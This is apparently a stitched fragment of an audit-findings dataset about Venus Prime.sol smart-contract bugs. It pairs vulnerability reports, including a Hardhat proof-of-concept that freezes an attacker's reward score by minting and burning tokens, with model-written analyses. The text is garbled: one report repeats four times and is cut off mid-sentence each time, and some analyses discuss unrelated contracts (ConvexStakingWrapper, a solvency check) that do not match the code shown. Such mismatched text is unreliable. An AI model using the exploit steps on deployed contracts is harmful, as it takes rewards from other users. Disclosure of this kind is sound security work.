(totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther"

            "detail": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther"

                    "description": "The vulnerability report correctly points out a business logic flaw specifically related to the shutdown mechanism of a staking contract. The `ConvexStakingWrapper` smart contract is designed to stop checkpoints when a shutdown occurs. The checkpoint process appears to be a mechanism for accounting for the reward distribution among users who have staked tokens. By ending checkpoints upon shutdown, the contract no longer updates the distribution of rewards, leading to an exploitable situation where new transfers are not accounted for but can still claim accumulated rewards.\n\nWhen `_beforeTokenTransfer` is called, it triggers `_checkpoint` to update the `reward_integral_for` users involved in a token transfer. This integral represents the accumulated rewards per token until that point. However, during a shutdown, this update is skipped (`if (isShutdown()) return;`), which the report correctly flags as the crux of the vulnerability.\n\nExploitation Scenario:\n1. If a user (Alice) has a balance and then transfers a portion of their tokens to another user (Bob) post-shutdown, `_checkpoint` will not be called, and Bob's `reward_integral_for` will not get updated.\n2. When Bob calls `claimRewards()`, the amount claimed is calculated as the balance of Bob's tokens multiplied by the difference between his integral value (which is outdated or uninitialized and thus zero) and the global `reward_integral`.\n3. This allows Bob to claim more rewards than he is entitled to, equivalent to the full accumulated rewards per token as if Bob had been holding the tokens since the last update.\n4. Bob can then transfer the balance to other new users, repeating the exploit.\n\nThe report recommends removing the shutdown check inside the `_checkpoint` method to ensure rewards are properly accounted for even if the contract has been shut down. This would maintain the integrity of the reward distribution regardless of the contract's operational state.\n\nAs for the provided `updateScores` function, it does not seem to be directly relevant to the vulnerability discussed above unless it interacts with rewards distributions and checkpoints in a way not shown in the provided code excerpt. The function itself seems to handle score updates for users with token holdings, with checks in place to prevent repeated updates within the same score update round. However, without more context or the full smart contract code, we cannot determine how this function relates to the vulnerability in the reward distribution mechanism.",

            "detail": "\n# Vulnerability details\n\n## Impact\n\nUsers earned rewards are calculated incorrectly because of the incorrect decimals value used to calculate user's `score` and markets `sumOfMembersScore`, which impacts the `delta` that is added to market's `rewardIndex` when `Prime.accrueInterest` function is called.\n\n## Proof of Concept\n\nAll users rewards are calculated with the following formula:\n\n```\nrewards = (rewardIndex - userRewardIndex) * scoreOfUser;\n```\n\nThis means that for user to earn rewards, market's `rewardIndex` needs to periodically increase.\n&nbsp;\n\n`markets[vToken].rewardIndex` is updated (increased), when `Prime.accrueInterest` is called.\n\n\n\n```solidity\n    uint256 delta;\n    if (markets[vToken].sumOfMembersScore > 0) {\n        delta = ((distributionIncome * EXP_SCALE) / markets[vToken].sumOfMembersScore);\n    }\n\n    markets[vToken].rewardIndex = markets[vToken].rewardIndex + delta;\n```\n\nFrom the code snippet above it is assumed that `markets[vToken].sumOfMembersScore` is precision of 18 decimals.\n\nTo ensure that user's `score` and markets `sumOfMemberScore` are correctly calculated, in  function `capital` is adjusted to 18 decimals. After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

Since shares represent proportional ownership of an underlying asset pool rather than a fixed amount, using shares directly in conjunction with fixed-size parameters like collateralizationRate leads to inaccuracies in the solvency computation.\n\nThe _isSolvent function checks if the collateral against borrowing is sufficient. It accrues interest by checking userBorrowPart against userCollateralShare and the totalBorrow state. The collateralShare is multiplied by collateralizationRate after adjusting for precision constants; this product is then converted to an amount using the yieldBox.toAmount function. This process is supposed to provide the amount of collateral available, which is then compared to the borrowing part adjusted for total elastic and base borrowing.\n\nHowever, using shares at this stage is incorrect because the share-to-amount conversion should occur before applying percentage-based calculations. This discrepancy can result in an underestimation of the amount of collateral required, thus exposing the protocol to potential losses since it determines whether a CDP is eligible for liquidation.\n\nThe Proof of Concept (PoC) provided shows that calculating with shares does not yield the same results as calculating with amounts. Since the protocol operates based on collateral amounts rather than shares, any inconsistency between these two methods of calculation could result in incorrect liquidation thresholds, unfairly favoring or disadvantaging users and possibly putting the protocol's funds at risk.\n\nAnother function, `_computeMaxAndMinLTVInAsset`, properly uses amounts instead of shares for such calculations, showing inconsistency in the protocol's calculation methods. Maintaining consistent use of either shares or amounts across all similar computations is crucial to ensure the reliability and security of the protocol.\n\nIn conclusion, the smart contract is indeed vulnerable, as the incorrect use of shares instead of amounts in solvency calculations can lead to inaccuracies in determining whether a CDP should be liquidated, thus affecting the protocol's financial solvency and security.",

            "detail": "\n# Vulnerability details\n\n## Impact\n\nUsers earned rewards are calculated incorrectly because of the incorrect decimals value used to calculate user's `score` and markets `sumOfMembersScore`, which impacts the `delta` that is added to market's `rewardIndex` when `Prime.accrueInterest` function is called.\n\n## Proof of Concept\n\nAll users rewards are calculated with the following formula:\n\n```\nrewards = (rewardIndex - userRewardIndex) * scoreOfUser;\n```\n\nThis means that for user to earn rewards, market's `rewardIndex` needs to periodically increase.\n&nbsp;\n\n`markets[vToken].rewardIndex` is updated (increased), when `Prime.accrueInterest` is called.\n\n\n\n```solidity\n    uint256 delta;\n    if (markets[vToken].sumOfMembersScore > 0) {\n        delta = ((distributionIncome * EXP_SCALE) / markets[vToken].sumOfMembersScore);\n    }\n\n    markets[vToken].rewardIndex = markets[vToken].rewardIndex + delta;\n```\n\nFrom the code snippet above it is assumed that `markets[vToken].sumOfMembersScore` is precision of 18 decimals.\n\nTo ensure that user's `score` and markets `sumOfMemberScore` are correctly calculated, in  function `capital` is adjusted to 18 decimals. After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

            "detail": "\n# Vulnerability details\n\n## Impact\n\nUsers earned rewards are calculated incorrectly because of the incorrect decimals value used to calculate user's `score` and markets `sumOfMembersScore`, which impacts the `delta` that is added to market's `rewardIndex` when `Prime.accrueInterest` function is called.\n\n## Proof of Concept\n\nAll users rewards are calculated with the following formula:\n\n```\nrewards = (rewardIndex - userRewardIndex) * scoreOfUser;\n```\n\nThis means that for user to earn rewards, market's `rewardIndex` needs to periodically increase.\n&nbsp;\n\n`markets[vToken].rewardIndex` is updated (increased), when `Prime.accrueInterest` is called.\n\n\n\n```solidity\n    uint256 delta;\n    if (markets[vToken].sumOfMembersScore > 0) {\n        delta = ((distributionIncome * EXP_SCALE) / markets[vToken].sumOfMembersScore);\n    }\n\n    markets[vToken].rewardIndex = markets[vToken].rewardIndex + delta;\n```\n\nFrom the code snippet above it is assumed that `markets[vToken].sumOfMembersScore` is precision of 18 decimals.\n\nTo ensure that user's `score` and markets `sumOfMemberScore` are correctly calculated, in  function `capital` is adjusted to 18 decimals. After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

            "detail": "\n# Vulnerability details\n\n## Impact\n\nUsers earned rewards are calculated incorrectly because of the incorrect decimals value used to calculate user's `score` and markets `sumOfMembersScore`, which impacts the `delta` that is added to market's `rewardIndex` when `Prime.accrueInterest` function is called.\n\n## Proof of Concept\n\nAll users rewards are calculated with the following formula:\n\n```\nrewards = (rewardIndex - userRewardIndex) * scoreOfUser;\n```\n\nThis means that for user to earn rewards, market's `rewardIndex` needs to periodically increase.\n&nbsp;\n\n`markets[vToken].rewardIndex` is updated (increased), when `Prime.accrueInterest` is called.\n\n\n\n```solidity\n    uint256 delta;\n    if (markets[vToken].sumOfMembersScore > 0) {\n        delta = ((distributionIncome * EXP_SCALE) / markets[vToken].sumOfMembersScore);\n    }\n\n    markets[vToken].rewardIndex = markets[vToken].rewardIndex + delta;\n```\n\nFrom the code snippet above it is assumed that `markets[vToken].sumOfMembersScore` is precision of 18 decimals.\n\nTo ensure that user's `score` and markets `sumOfMemberScore` are correctly calculated, in  function `capital` is adjusted to 18 decimals. After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

This miscalculation leads to inaccurate solvency checks within the protocol.\n\nThe given proof of concept demonstrates how the multiplication of the `collateralizationRate` by the `collateralShare` can produce an incorrect solvency check outcome that is not in favor of the protocol. Since the `_isSolvent` method is central to determining whether a position can be liquidated, the described problem poses a high severity risk to the protocol. To ensure accurate calculations, conversions to amounts should be used before applying rates, such as the `collateralizationRate`.\n\nMoreover, other parts of the protocol, such as `_computeMaxAndMinLTVInAsset`, correctly use amounts instead of shares, indicating inconsistency across the protocol, which can lead to unintended behavior and further issues.\n\nIn summary, the code does not correctly apply the collateralization rate to the user's collateral when performing solvency checks and potentially other calculations. This could result in positions being incorrectly deemed solvent or insolvent, depending on the discrepancy between shares and actual amounts. As such, it is critical for the maintainers to address this issue and adjust all relevant calculations to use amounts instead of shares.",

The report also points out inconsistencies with other methods within the protocol that handle collateral correctly, further highlighting the issue. The Proof of Concept confirms the miscalculation, indicating a significant risk to the protocol's economic integrity and a possibility of wrongful liquidations or missed liquidations.
